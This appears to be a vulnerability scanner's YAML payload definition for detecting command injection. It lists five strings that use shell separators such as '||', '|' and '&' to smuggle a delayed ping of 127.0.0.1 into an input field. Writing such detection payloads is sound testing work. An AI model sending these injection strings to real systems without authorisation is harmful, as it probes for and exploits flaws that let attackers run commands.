F00001:
  name: Command Injections
  description: 命令注入
  level: critical
  payloads:
    - "|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &"
    - "| ping -i 30 127.0.0.1 |"
    - "| ping -n 30 127.0.0.1 |"
    - "& ping -i 30 127.0.0.1 &"
    - "& ping -n 30 127.0.0.1 &"